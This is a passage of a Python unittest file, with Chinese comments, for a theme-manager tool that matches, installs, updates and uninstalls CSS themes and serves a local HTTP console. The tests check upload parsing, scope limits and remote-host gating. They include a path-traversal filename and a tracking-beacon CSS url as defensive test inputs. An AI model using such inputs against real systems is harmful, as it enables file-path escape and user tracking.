             mock.patch.object(tm, "fetch_default_branch", return_value="main"), \
             mock.patch.object(tm, "fetch_git_tree", return_value={
                 "files": ["theme.css"], "blobs": blobs,
                 "anchor": "d" * 40, "etag": "", "not_modified": False,
             }):
            with contextlib.redirect_stdout(io.StringIO()):
                rc, result = tm.run_match(copy.deepcopy(self.cfg),
                                          uploads=[("theme.css", css_tree)], log=quiet)
        self.assertEqual(rc, tm.EXIT_OK, result)
        installed = json.loads((self.rd / "installed.json").read_text(encoding="utf-8"))
        self.assertEqual(installed["tracked_meta"]["kind"], "git-tree")
        self.assertEqual(installed["tracked"]["theme.css"]["hash"], tm.git_blob_sha(css_tree))
        self.assertEqual(self.read_config()["source"], "git-tree")

    def test_match_against_older_release_when_latest_differs(self):
        # 上传文件来自旧版本：最新 release 无匹配 → 命中历史 release，记录其 tag
        css_old = b"body { color: old; }"
        css_new = b"body { color: new; }"
        arch_v1 = self.rd / "zips" / "v1" / "theme.zip"
        arch_v2 = self.rd / "zips" / "v2" / "theme.zip"
        for path, css in ((arch_v1, css_old), (arch_v2, css_new)):
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_bytes(zip_bytes({"sample/theme.css": css.decode()}))
        by_url = {"https://github.com/example/sample/v1/theme.zip": arch_v1,
                  "https://github.com/example/sample/v2/theme.zip": arch_v2}
        releases = [{"tag_name": tag, "assets": [{
            "name": "theme.zip", "size": by_url[url].stat().st_size,
            "updated_at": "2026-11-0%dT00:00:00Z" % (1 if tag == "v1" else 2),
            "browser_download_url": url,
        }]} for tag, url in (("v2", "https://github.com/example/sample/v2/theme.zip"),
                             ("v1", "https://github.com/example/sample/v1/theme.zip"))]
        with mock.patch.object(tm, "fetch_all_releases", return_value=releases), \
             mock.patch.object(tm, "download_asset",
                               side_effect=lambda asset, dest, log=quiet:
                               (by_url[asset["browser_download_url"]], False)):
            with contextlib.redirect_stdout(io.StringIO()):
                rc, result = tm.run_match(copy.deepcopy(self.cfg),
                                          uploads=[("mine.css", css_old)], log=quiet)
        self.assertEqual(rc, tm.EXIT_OK, result)
        installed = json.loads((self.rd / "installed.json").read_text(encoding="utf-8"))
        self.assertEqual(installed["version"], "v1")
        self.assertEqual(installed["tracked"]["theme.css"]["hash"], tm.sha256_hex(css_old))
        self.assertEqual(installed["tracked_meta"]["asset"], "theme.zip")


    def test_rematch_carries_over_same_source_records(self):
        # 重复匹配防范围收缩：未重新上传的字体（与胜出候选同来源、仍在清单中）
        # 旧记录原样并入登记，files/tracked 不丢
        css, font = b"body { color: purple; }", b"FONTDATA"
        blobs = {"theme.css": tm.git_blob_sha(css),
                 "fonts/theme.woff2": tm.git_blob_sha(font),
                 "README.md": tm.git_blob_sha(b"readme")}

        def run(uploads):
            with mock.patch.object(tm, "fetch_all_releases", return_value=[]), \
                 mock.patch.object(tm, "fetch_default_branch", return_value="main"), \
                 mock.patch.object(tm, "fetch_git_tree", return_value={
                     "files": sorted(blobs), "blobs": blobs,
                     "anchor": "e" * 40, "etag": "", "not_modified": False}):
                with contextlib.redirect_stdout(io.StringIO()):
                    return tm.run_match(copy.deepcopy(self.cfg), uploads=uploads, log=quiet)

        rc, _ = run([("theme.css", css), ("f.woff2", font)])
        self.assertEqual(rc, tm.EXIT_OK)
        rc2, result2 = run([("theme.css", css)])  # 只重新上传 CSS
        self.assertEqual(rc2, tm.EXIT_OK, result2)
        self.assertEqual(result2["carried"], 1)
        self.assertEqual(result2["replaced"], [])
        installed = json.loads((self.rd / "installed.json").read_text(encoding="utf-8"))
        self.assertEqual(installed["tracked"]["fonts/theme.woff2"]["hash"],
                         tm.git_blob_sha(font))
        self.assertEqual(installed["files"], ["fonts/theme.woff2", "theme.css"])

    def test_rematch_replaces_records_from_different_source(self):
        # 旧登记来自 release-archive：二次匹配命中源码树（来源不同）→ 旧记录
        # 中未重新匹配的路径被替换并明示，不并入新来源的登记
        old_record = {"version": "v1", "mode": "matched",
                      "files": ["legacy.css", "theme.css"],
                      "tracked": {"theme.css": {"hash": tm.sha256_hex(b"old"), "ts": ""},
                                  "legacy.css": {"hash": tm.sha256_hex(b"legacy"), "ts": ""}},
                      "tracked_meta": {"kind": "release-archive", "asset": "theme.zip"}}
        self.rd.mkdir(parents=True)
        (self.rd / "installed.json").write_text(json.dumps(old_record), encoding="utf-8")
        css = b"body { color: from-tree; }"
        blobs = {"theme.css": tm.git_blob_sha(css)}
        with mock.patch.object(tm, "fetch_all_releases", return_value=[]), \
             mock.patch.object(tm, "fetch_default_branch", return_value="main"), \
             mock.patch.object(tm, "fetch_git_tree", return_value={
                 "files": ["theme.css"], "blobs": blobs,
                 "anchor": "f" * 40, "etag": "", "not_modified": False}):
            with contextlib.redirect_stdout(io.StringIO()):
                rc, result = tm.run_match(copy.deepcopy(self.cfg),
                                          uploads=[("theme.css", css)], log=quiet)
        self.assertEqual(rc, tm.EXIT_OK, result)
        self.assertEqual(result["replaced"], ["legacy.css"])
        installed = json.loads((self.rd / "installed.json").read_text(encoding="utf-8"))
        self.assertNotIn("legacy.css", installed["tracked"])
        self.assertEqual(installed["tracked"]["theme.css"]["hash"], tm.git_blob_sha(css))
        self.assertEqual(installed["tracked_meta"]["kind"], "git-tree")


class MatchedRepoFlowTests(unittest.TestCase):
    """手动匹配仓库（manual_matched 标记）的特化安装/更新/卸载流程：
    一切基于本地记录的 tracked 结构，不做模式扩展、不覆盖本地自定义。"""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        self.themes = self.root / "themes"
        self.themes.mkdir()
        self.cfg = {"id": "sample", "name": "Sample", "owner": "example", "repo": "sample",
                    "asset_re": None, "css_dir": "", "theme_re": r"^[^/]+\.css$",
                    "assets_dirs": ["fonts"], "bridge": None, "min_themes": 1,
                    "source": "git-tree", "branch": "main", "manual_matched": True}
        self.config = self.root / "repos.json"
        self.config.write_text(json.dumps({"settings": {"keep_zips": 2},
                                           "repos": {"sample": self.cfg}}), encoding="utf-8")
        self.rd = self.root / "repos" / "sample"
        for patch in (mock.patch.object(tm, "DATA_DIR", self.root / "repos"),
                      mock.patch.object(tm, "CONFIG_PATH", self.config),
                      mock.patch.object(tm, "detect_themes_dir", return_value=self.themes)):
            patch.start()
            self.addCleanup(patch.stop)
        self.old_css = b"body { color: old; }"
        self.new_css = b"body { color: new; }"
        self.old_font = b"FONT-OLD"
        self.new_font = b"FONT-NEW"

    def install(self, cfg=None, **options):
        with contextlib.redirect_stdout(io.StringIO()):
            return tm.run_install(copy.deepcopy(cfg or self.cfg), log=quiet, **options)

    def seed_matched(self, css_hash=None, font_hash=None, version="oldtree"):
        """写入 matched 安装记录（哈希默认 = 旧内容）。"""
        css_hash = css_hash or tm.git_blob_sha(self.old_css)
        font_hash = font_hash or tm.git_blob_sha(self.old_font)
        self.rd.mkdir(parents=True, exist_ok=True)
        (self.rd / "installed.json").write_text(json.dumps({
            "version": version, "installed_at": "2026-11-20 10:00:00",
            "mode": "matched",
            "files": ["fonts/theme.woff2", "theme.css"],
            "tracked": {"theme.css": {"hash": css_hash, "ts": ""},
                        "fonts/theme.woff2": {"hash": font_hash, "ts": ""}},
            "tracked_meta": {"kind": "git-tree", "anchor": "o" * 40,
                             "branch": "main", "matched_at": "2026-11-20 10:00:00"},
        }, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")

    def tree_mock(self, css_blob=None, font_blob=None, anchor="n" * 40):
        blobs = {"theme.css": css_blob, "fonts/theme.woff2": font_blob,
                 "README.md": tm.git_blob_sha(b"readme")}
        return mock.patch.object(tm, "fetch_git_tree", return_value={
            "files": sorted(blobs), "blobs": blobs, "anchor": anchor,
            "etag": "", "not_modified": False,
        })

    def test_merge_update_overwrites_uncustomized_and_keeps_customized(self):
        self.seed_matched()
        (self.themes / "theme.css").write_bytes(self.old_css)  # 未自定义
        (self.themes / "fonts").mkdir()
        (self.themes / "fonts" / "theme.woff2").write_bytes(b"CUSTOMIZED")  # 用户自定义
        raw = {"https://raw.githubusercontent.com/example/sample/main/theme.css": self.new_css}
        with mock.patch.object(tm, "fetch_latest_release", return_value={
            "release": None, "source": "api", "no_release": True, "not_modified": False,
        }), self.tree_mock(css_blob=tm.git_blob_sha(self.new_css),
                           font_blob=tm.git_blob_sha(self.old_font)), \
             mock.patch.object(tm, "download_bytes", side_effect=lambda url: raw[url]):
            rc, result = self.install()
        self.assertEqual(rc, tm.EXIT_OK, result)
        # 上游已变且本地未自定义 → 更新；本地自定义 → 保留不动
        self.assertEqual((self.themes / "theme.css").read_bytes(), self.new_css)
        self.assertEqual((self.themes / "fonts" / "theme.woff2").read_bytes(), b"CUSTOMIZED")
        installed = json.loads((self.rd / "installed.json").read_text(encoding="utf-8"))
        self.assertEqual(installed["mode"], "matched")
        self.assertEqual(installed["version"], "n" * 7)
        self.assertEqual(installed["tracked"]["theme.css"]["hash"],
                         tm.git_blob_sha(self.new_css))
        self.assertEqual(installed["tracked"]["fonts/theme.woff2"]["hash"],
                         tm.git_blob_sha(self.old_font))  # 保留项维持原记录

    def test_up_to_date_matched_repo_writes_nothing(self):
        self.seed_matched()
        (self.themes / "theme.css").write_bytes(self.old_css)
        (self.themes / "fonts").mkdir()
        (self.themes / "fonts" / "theme.woff2").write_bytes(self.old_font)
        with mock.patch.object(tm, "fetch_latest_release", return_value={
            "release": None, "source": "api", "no_release": True, "not_modified": False,
        }), self.tree_mock(css_blob=tm.git_blob_sha(self.old_css),
                           font_blob=tm.git_blob_sha(self.old_font)), \
             mock.patch.object(tm, "download_bytes") as dl:
            rc, result = self.install()
        self.assertEqual(rc, tm.EXIT_OK, result)
        dl.assert_not_called()
        self.assertEqual((self.themes / "theme.css").read_bytes(), self.old_css)

    def test_remote_host_gate_pauses_before_any_write_or_record_change(self):
        beacon_css = b"body { background: url(https://beacon.example/pixel); }"
        self.seed_matched(css_hash=tm.git_blob_sha(self.old_css))
        (self.themes / "theme.css").write_bytes(self.old_css)
        records_before = (self.rd / "installed.json").read_bytes()
        # 本地缺失的字体按「恢复」预取字节（不引入远程引用，不触发票门）
        raw = {"https://raw.githubusercontent.com/example/sample/main/theme.css": beacon_css,
               "https://raw.githubusercontent.com/example/sample/main/fonts/theme.woff2":
                   self.old_font}
        with mock.patch.object(tm, "fetch_latest_release", return_value={
            "release": None, "source": "api", "no_release": True, "not_modified": False,
        }), self.tree_mock(css_blob=tm.git_blob_sha(beacon_css),
                           font_blob=tm.git_blob_sha(self.old_font)), \
             mock.patch.object(tm, "download_bytes", side_effect=lambda url: raw[url]):
            rc, result = self.install()
        self.assertEqual(rc, tm.EXIT_CONFIRM)
        self.assertEqual(result["remote_hosts"], ["beacon.example"])
        self.assertEqual((self.themes / "theme.css").read_bytes(), self.old_css)
        self.assertEqual((self.rd / "installed.json").read_bytes(), records_before)

    def test_clean_reinstall_scopes_strictly_to_recorded_files(self):
        self.seed_matched()
        (self.themes / "theme.css").write_bytes(b"LOCAL-EDIT")      # 自定义
        (self.themes / "other.css").write_bytes(b"other repo")      # 其他仓库主题
        (self.themes / "fonts").mkdir()
        (self.themes / "fonts" / "theme.woff2").write_bytes(b"CUSTOMIZED")
        raw = {
            "https://raw.githubusercontent.com/example/sample/main/theme.css": self.new_css,
            "https://raw.githubusercontent.com/example/sample/main/fonts/theme.woff2": self.new_font,
        }
        with mock.patch.object(tm, "fetch_latest_release", return_value={
            "release": None, "source": "api", "no_release": True, "not_modified": False,
        }), self.tree_mock(css_blob=tm.git_blob_sha(self.new_css),
                           font_blob=tm.git_blob_sha(self.new_font)), \
             mock.patch.object(tm, "download_bytes", side_effect=lambda url: raw[url]):
            rc, result = self.install(mode="clean")
        self.assertEqual(rc, tm.EXIT_OK, result)
        # 宽 theme_re（^[^/]+\.css$）也不波及其他仓库文件；自定义被备份后重置
        self.assertEqual((self.themes / "other.css").read_bytes(), b"other repo")
        self.assertEqual((self.themes / "theme.css").read_bytes(), self.new_css)
        self.assertEqual((self.themes / "fonts" / "theme.woff2").read_bytes(), self.new_font)
        self.assertTrue(list(self.root.glob("themes-backup-sample-*")))
        installed = json.loads((self.rd / "installed.json").read_text(encoding="utf-8"))
        self.assertEqual(installed["tracked"]["theme.css"]["hash"],
                         tm.git_blob_sha(self.new_css))

    def test_clean_reinstall_rewrites_upstream_unchanged_files(self):
        # 回归：上游未变化的文件在 clean 下也必须先移除再重写，而不是被删掉
        self.seed_matched()
        (self.themes / "theme.css").write_bytes(self.old_css)
        (self.themes / "fonts").mkdir()
        (self.themes / "fonts" / "theme.woff2").write_bytes(self.old_font)
        raw = {
            "https://raw.githubusercontent.com/example/sample/main/theme.css": self.old_css,
            "https://raw.githubusercontent.com/example/sample/main/fonts/theme.woff2": self.old_font,
        }
        with mock.patch.object(tm, "fetch_latest_release", return_value={
            "release": None, "source": "api", "no_release": True, "not_modified": False,
        }), self.tree_mock(css_blob=tm.git_blob_sha(self.old_css),
                           font_blob=tm.git_blob_sha(self.old_font)), \
             mock.patch.object(tm, "download_bytes", side_effect=lambda url: raw[url]) as dl:
            rc, result = self.install(mode="clean")
        self.assertEqual(rc, tm.EXIT_OK, result)
        self.assertEqual((self.themes / "theme.css").read_bytes(), self.old_css)
        self.assertEqual((self.themes / "fonts" / "theme.woff2").read_bytes(), self.old_font)
        self.assertEqual(dl.call_count, 2)  # full 取回全部内容用于重写
        self.assertTrue(list(self.root.glob("themes-backup-sample-*")))  # 确实先备份移除过
        installed = json.loads((self.rd / "installed.json").read_text(encoding="utf-8"))
        self.assertEqual(installed["files"], ["fonts/theme.woff2", "theme.css"])
        self.assertEqual(installed["tracked"]["theme.css"]["hash"],
                         tm.git_blob_sha(self.old_css))

    def test_clean_reinstall_regenerates_bridge(self):
        cfg = dict(self.cfg, bridge={"file": "github.user.css",
                                     "import": "sample/theme.css",
                                     "requires": "theme.css"})
        self.seed_matched()
        (self.themes / "theme.css").write_bytes(self.old_css)
        (self.themes / "fonts").mkdir()
        (self.themes / "fonts" / "theme.woff2").write_bytes(self.old_font)
        (self.themes / "github.user.css").write_text('@import url("sample/theme.css");',
                                                     encoding="utf-8")  # 本工具生成的桥接
        raw = {
            "https://raw.githubusercontent.com/example/sample/main/theme.css": self.old_css,
            "https://raw.githubusercontent.com/example/sample/main/fonts/theme.woff2": self.old_font,
        }
        with mock.patch.object(tm, "fetch_latest_release", return_value={
            "release": None, "source": "api", "no_release": True, "not_modified": False,
        }), self.tree_mock(css_blob=tm.git_blob_sha(self.old_css),
                           font_blob=tm.git_blob_sha(self.old_font)), \
             mock.patch.object(tm, "download_bytes", side_effect=lambda url: raw[url]):
            rc, result = self.install(cfg, mode="clean")
        self.assertEqual(rc, tm.EXIT_OK, result)
        # clean 移除后桥接被重新生成，且 import 指向本仓库主题
        bridge = (self.themes / "github.user.css").read_text(encoding="utf-8")
        self.assertIn("sample/theme.css", bridge)
        installed = json.loads((self.rd / "installed.json").read_text(encoding="utf-8"))
        self.assertIn("github.user.css", installed["files"])

    def test_clean_reinstall_when_upstream_removed_everything(self):
        self.seed_matched()
        (self.themes / "theme.css").write_bytes(self.old_css)
        (self.themes / "fonts").mkdir()
        (self.themes / "fonts" / "theme.woff2").write_bytes(self.old_font)
        blobs = {"README.md": tm.git_blob_sha(b"readme")}  # tracked 路径已全部消失
        with mock.patch.object(tm, "fetch_latest_release", return_value={
            "release": None, "source": "api", "no_release": True, "not_modified": False,
        }), mock.patch.object(tm, "fetch_git_tree", return_value={
            "files": sorted(blobs), "blobs": blobs, "anchor": "z" * 40,
            "etag": "", "not_modified": False,
        }):
            rc, result = self.install(mode="clean")
        self.assertEqual(rc, tm.EXIT_OK, result)
        # 上游无对应内容：记录范围备份移除、无新文件写入；tracked 已空，
        # 与卸载同语义收尾（清记录+清标记），仓库回到常规流程
        self.assertFalse((self.themes / "theme.css").exists())
        self.assertFalse((self.themes / "fonts" / "theme.woff2").exists())
        self.assertTrue(list(self.root.glob("themes-backup-sample-*")))
        self.assertFalse((self.rd / "installed.json").exists())
        cfg = json.loads(self.config.read_text(encoding="utf-8"))["repos"]["sample"]
        self.assertNotIn("manual_matched", cfg)

    def test_uninstall_uses_record_scope_and_clears_flag(self):
        self.seed_matched()
        (self.themes / "theme.css").write_bytes(self.old_css)
        (self.themes / "other.css").write_bytes(b"other repo")
        (self.themes / "fonts").mkdir()
        (self.themes / "fonts" / "theme.woff2").write_bytes(self.old_font)
        with contextlib.redirect_stdout(io.StringIO()):
            rc, result = tm.run_uninstall(copy.deepcopy(self.cfg), log=quiet)
        self.assertEqual(rc, tm.EXIT_OK, result)
        # 严格按记录移除：other.css 不受宽 theme_re 影响
        self.assertFalse((self.themes / "theme.css").exists())
        self.assertFalse((self.themes / "fonts" / "theme.woff2").exists())
        self.assertEqual((self.themes / "other.css").read_bytes(), b"other repo")
        self.assertFalse((self.rd / "installed.json").exists())
        cfg = json.loads(self.config.read_text(encoding="utf-8"))["repos"]["sample"]
        self.assertNotIn("manual_matched", cfg)

    def test_rescan_preserves_matched_records(self):
        self.seed_matched()
        (self.themes / "theme.css").write_bytes(self.old_css)
        records_before = (self.rd / "installed.json").read_bytes()
        with mock.patch.object(tm, "fetch_latest_release", return_value={
            "release": None, "source": "api", "no_release": True, "not_modified": False,
        }), self.tree_mock(css_blob=tm.git_blob_sha(self.old_css),
                           font_blob=tm.git_blob_sha(self.old_font)):
            with contextlib.redirect_stdout(io.StringIO()):
                rc, result = tm.run_rescan(copy.deepcopy(self.cfg), log=quiet)
        self.assertEqual(rc, tm.EXIT_OK, result)
        self.assertTrue(result["adopted"])
        self.assertEqual((self.rd / "installed.json").read_bytes(), records_before)

    def test_stale_flag_without_records_refuses_pattern_fallback(self):
        # 标记在而记录缺失：绝不静默回退常规流程（常规 clean/卸载按 theme_re
        # 模式取占用范围，宽模式会波及其他仓库主题）——报错且零写入
        (self.themes / "other.css").write_bytes(b"other repo")
        archive = self.rd / "zips" / "v9" / "theme.zip"
        archive.parent.mkdir(parents=True)
        archive.write_bytes(zip_bytes({"theme.css": "body { color: regular; }"}))
        with mock.patch.object(tm, "fetch_latest_release", return_value={
            "release": {"tag_name": "v9", "assets": [{
                "name": "theme.zip", "size": archive.stat().st_size,
                "browser_download_url": "https://github.com/example/sample/theme.zip",
            }]}, "source": "api", "not_modified": False,
        }), mock.patch.object(tm, "download_asset", return_value=(archive, True)) as dl:
            rc, result = self.install()
        self.assertEqual(rc, tm.EXIT_DOWNLOAD, result)
        self.assertIn("match", result["message"])
        dl.assert_not_called()
        self.assertEqual((self.themes / "other.css").read_bytes(), b"other repo")
        self.assertEqual(sorted(p.name for p in self.themes.iterdir()), ["other.css"])
        cfg = json.loads(self.config.read_text(encoding="utf-8"))["repos"]["sample"]
        self.assertTrue(cfg["manual_matched"])  # 标记保留，等待人工重新 match/remove

    def test_merge_keeps_customized_records_verbatim(self):
        # 保留项（本地已自定义）完整维持原记录——ts/size 不刷成上游新值；
        # 否则下次 check 的元数据快路径会误判一致，内容差异信号提前消失
        self.seed_matched()
        (self.themes / "theme.css").write_bytes(self.old_css)
        (self.themes / "fonts").mkdir()
        (self.themes / "fonts" / "theme.woff2").write_bytes(b"CUSTOMIZED")
        state = {
            "theme.css": {"hash": tm.git_blob_sha(self.new_css),
                          "data": self.new_css, "ts": ""},
            "fonts/theme.woff2": {"hash": tm.git_blob_sha(self.new_font),
                                  "data": self.new_font,
                                  "ts": "2026-11-22T00:00:00Z", "size": 9},
        }
        with mock.patch.object(tm, "fetch_matched_state", return_value={
            "kind": "git-tree", "version": "newtree", "state": state,
            "meta": {"kind": "git-tree", "anchor": "n" * 40, "branch": "main"}}):
            rc, result = self.install()
        self.assertEqual(rc, tm.EXIT_OK, result)
        installed = json.loads((self.rd / "installed.json").read_text(encoding="utf-8"))
        self.assertEqual(installed["tracked"]["fonts/theme.woff2"],
                         {"hash": tm.git_blob_sha(self.old_font), "ts": ""})
        self.assertEqual(installed["tracked"]["theme.css"]["hash"],
                         tm.git_blob_sha(self.new_css))

    def test_uninstall_with_corrupt_records_refuses_pattern_sweep(self):
        # 标记在而记录损坏：卸载拒绝按 theme_re 模式扩大范围（宽模式会波及
        # 其他仓库主题），报错且零写入
        (self.themes / "theme.css").write_bytes(self.old_css)
        (self.themes / "other.css").write_bytes(b"other repo")
        self.rd.mkdir(parents=True)
        (self.rd / "installed.json").write_text("{corrupted json", encoding="utf-8")
        with contextlib.redirect_stdout(io.StringIO()):
            rc, result = tm.run_uninstall(copy.deepcopy(self.cfg), log=quiet)
        self.assertEqual(rc, tm.EXIT_INSTALL)
        self.assertIn("match", result["message"])
        self.assertTrue((self.themes / "theme.css").exists())
        self.assertTrue((self.themes / "other.css").exists())


class MatchUploadApiTests(unittest.TestCase):
    """/api/repos/<id>/match 的 multipart 解析与任务派发。"""

    class FakeHeaders(dict):
        def get(self, key, default=None):
            return super().get(key, default)

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        self.cfg = {"id": "sample", "name": "Sample", "owner": "example", "repo": "sample",
                    "asset_re": None, "css_dir": None, "theme_re": None,
                    "assets_dirs": None, "bridge": None, "min_themes": None}
        self.config = self.root / "repos.json"
        self.config.write_text(json.dumps({"settings": {"keep_zips": 2},
                                           "repos": {"sample": self.cfg}}), encoding="utf-8")
        patcher = mock.patch.multiple(tm, DATA_DIR=self.root / "repos",
                                      CONFIG_PATH=self.config)
        patcher.start()
        self.addCleanup(patcher.stop)

    def make_handler(self, body, boundary="XbOuNdArYx"):
        headers = self.FakeHeaders({
            "Content-Type": "multipart/form-data; boundary=%s" % boundary,
            "Content-Length": str(len(body)),
        })
        handler = tm.UiHandler.__new__(tm.UiHandler)
        handler.headers = headers
        handler.rfile = io.BytesIO(body)
        handler.path = "/api/repos/sample/match"
        handler._guard_mutation = mock.Mock(return_value=True)
        handler._json = mock.Mock()
        return handler

    def test_match_endpoint_parses_multipart_and_starts_job(self):
        boundary = "XbOuNdArYx"
        css = b"body { color: navy; }"
        body = (b"--" + boundary.encode() + b"\r\n"
                b"Content-Disposition: form-data; name=\"files\"; "
                b"filename=\"..\\..\\theme.css\"\r\n\r\n" + css + b"\r\n"
                b"--" + boundary.encode() + b"\r\n"
                b"Content-Disposition: form-data; name=\"files\"; "
                b"filename=\"font.woff2\"\r\n\r\n" + b"FONT" + b"\r\n"
                b"--" + boundary.encode() + b"--\r\n")
        handler = self.make_handler(body, boundary)
        captured = {}

        def fake_start(kind, repo_id, fn):
            captured["fn"] = fn
            return True

        with mock.patch.object(tm.JOBS, "start", side_effect=fake_start), \
                mock.patch.object(tm, "run_match", return_value=(tm.EXIT_OK, {"ok": True})) as run:
            handler.do_POST()
            run.assert_not_called()
            captured["fn"](quiet)
        # 文件名取 basename（防路径穿越）；内容按字节原样传递
        uploads = run.call_args[1]["uploads"] if "uploads" in run.call_args[1] \
            else run.call_args[0][1]
        self.assertEqual(uploads, [("theme.css", css), ("font.woff2", b"FONT")])
        handler._json.assert_called_once_with({"ok": True, "started": "match"})

    def test_match_endpoint_rejects_oversized_or_empty_uploads(self):
        handler = self.make_handler(b"", boundary="XbOuNdArYx")
        with mock.patch.object(tm.JOBS, "start") as start:
            handler.do_POST()
        start.assert_not_called()
        self.assertEqual(handler._json.call_args[0][1], 400)

        big = tm.MAX_UPLOAD_BYTES + 1
        headers = self.FakeHeaders({
            "Content-Type": "multipart/form-data; boundary=X",
            "Content-Length": str(big),
        })
        handler2 = tm.UiHandler.__new__(tm.UiHandler)
        handler2.headers = headers
        handler2.rfile = io.BytesIO(b"x" * 16)
        handler2.path = "/api/repos/sample/match"
        handler2._guard_mutation = mock.Mock(return_value=True)
        handler2._json = mock.Mock()
        with mock.patch.object(tm.JOBS, "start") as start:
            handler2.do_POST()
        start.assert_not_called()
        self.assertEqual(handler2._json.call_args[0][1], 400)


class UploadConnectionTests(unittest.TestCase):
    """超限/畸形上传被拒绝后必须排空请求体：HTTP/1.1 keep-alive 连接不能失步
    （残留字节被当作下一个请求解析，浏览器复用连接的后续调用会失败）。"""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        cfg = {"id": "sample", "name": "Sample", "owner": "example", "repo": "sample",
               "asset_re": None, "css_dir": None, "theme_re": None,
               "assets_dirs": None, "bridge": None, "min_themes": None}
        self.config = self.root / "repos.json"
        self.config.write_text(json.dumps({"settings": {"keep_zips": 2},
                                           "repos": {"sample": cfg}}), encoding="utf-8")
        for patch in (mock.patch.object(tm, "DATA_DIR", self.root / "repos"),
                      mock.patch.object(tm, "CONFIG_PATH", self.config),
                      mock.patch.object(tm, "MAX_UPLOAD_BYTES", 2048)):
            patch.start()
            self.addCleanup(patch.stop)
        self.httpd = http.server.ThreadingHTTPServer(("127.0.0.1", 0), tm.UiHandler)
        self.port = self.httpd.server_address[1]
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()

        def stop_server():
            self.httpd.shutdown()  # 先停事件循环再关 socket，避免线程内抛异常
            self.httpd.server_close()

        self.addCleanup(stop_server)

    def test_oversized_upload_does_not_desync_keepalive_connection(self):
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10)
        self.addCleanup(conn.close)
        conn.request("POST", "/api/repos/sample/match", body=b"x" * 4096, headers={
            "Content-Type": "multipart/form-data; boundary=X",
            "X-Local-Tool": "1"})
        resp = conn.getresponse()
        self.assertEqual(resp.status, 400)
        resp.read()
        # 同一连接上的后续请求必须正常应答（请求体已被排空，连接字节同步）
        conn.request("POST", "/api/lang", body=json.dumps({"lang": "xx"}).encode(),
                     headers={"Content-Type": "application/json", "X-Local-Tool": "1"})
        resp2 = conn.getresponse()
        self.assertEqual(resp2.status, 400)
        self.assertIn("error", json.loads(resp2.read().decode("utf-8")))


class RescanOnlineInferenceTests(unittest.TestCase):
    """rescan 无本地线索时走三级来源链联网推断。"""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        self.themes = self.root / "themes"
        self.themes.mkdir()
        self.cfg = {"id": "sample", "name": "Sample", "owner": "example", "repo": "sample",
                    "asset_re": None, "css_dir": None, "theme_re": None,
                    "assets_dirs": None, "bridge": None, "min_themes": None}
        self.config = self.root / "repos.json"
        self.config.write_text(json.dumps({"settings": {"keep_zips": 2},
                                           "repos": {"sample": self.cfg}}), encoding="utf-8")
        self.rd = self.root / "repos" / "sample"
        for patch in (mock.patch.object(tm, "DATA_DIR", self.root / "repos"),
                      mock.patch.object(tm, "CONFIG_PATH", self.config),
                      mock.patch.object(tm, "detect_themes_dir", return_value=self.themes)):
            patch.start()
            self.addCleanup(patch.stop)

    def test_rescan_infers_structure_from_source_tree(self):
        blobs = {"theme.css": tm.git_blob_sha(b"body {}")}
        with mock.patch.object(tm, "fetch_latest_release", return_value={
            "release": None, "source": "api", "no_release": True, "not_modified": False,
        }), mock.patch.object(tm, "fetch_default_branch", return_value="main"), \
             mock.patch.object(tm, "fetch_git_tree", return_value={
                 "files": ["README.md", "theme.css"], "blobs": blobs,
                 "anchor": "b" * 40, "etag": "", "not_modified": False,
             }):
            with contextlib.redirect_stdout(io.StringIO()):
                rc, result = tm.run_rescan(copy.deepcopy(self.cfg), log=quiet)
        self.assertEqual(rc, tm.EXIT_OK, result)
        cfg = json.loads(self.config.read_text(encoding="utf-8"))["repos"]["sample"]
        self.assertEqual(cfg["source"], "git-tree")
        self.assertEqual(cfg["branch"], "main")
        self.assertEqual(cfg["theme_re"], "^[^/]+\\.css$")

    def test_rescan_infers_structure_from_loose_release_files(self):
        css = b"body { color: orange; }"
        url = "https://github.com/example/sample/releases/download/v2/theme.css"
        with mock.patch.object(tm, "fetch_latest_release", return_value={
            "release": {"tag_name": "v2", "assets": [
                {"name": "theme.css", "size": len(css),
                 "updated_at": "2026-11-02T00:00:00Z", "browser_download_url": url},
            ]}, "source": "api", "not_modified": False,
        }), mock.patch.object(tm, "download_bytes", return_value=css):
            with contextlib.redirect_stdout(io.StringIO()):
                rc, result = tm.run_rescan(copy.deepcopy(self.cfg), log=quiet)
        self.assertEqual(rc, tm.EXIT_OK, result)
        cfg = json.loads(self.config.read_text(encoding="utf-8"))["repos"]["sample"]
        self.assertEqual(cfg["source"], "release-files")
        self.assertEqual(cfg["theme_re"], "^[^/]+\\.css$")


class ConfigGenerationTests(unittest.TestCase):
    def test_read_only_load_keeps_missing_config_absent(self):
        # 只读命令零写入：clone/解压后 list/check 不产生 repos.json（冒烟测试有断言）
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "repos.json"
            with mock.patch.object(tm, "CONFIG_PATH", path):
                data = tm.load_config()
            self.assertEqual(data, {"settings": {"keep_zips": 2}, "repos": {}})
            self.assertFalse(path.exists())

    def test_console_startup_generates_default_registry(self):
        # 网页控制台启动（首次运行）生成默认注册表，且不覆盖已有文件
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "repos.json"
            with mock.patch.object(tm, "CONFIG_PATH", path):
                tm.ensure_default_config()
                self.assertTrue(path.is_file())
                self.assertEqual(json.loads(path.read_text(encoding="utf-8")),
                                 {"settings": {"keep_zips": 2}, "repos": {}})
                path.write_text('{"settings": {"keep_zips": 9}, "repos": {}}',
                                encoding="utf-8")
                tm.ensure_default_config()
                self.assertEqual(
                    json.loads(path.read_text(encoding="utf-8"))["settings"]["keep_zips"], 9)


if __name__ == "__main__":
    unittest.main()
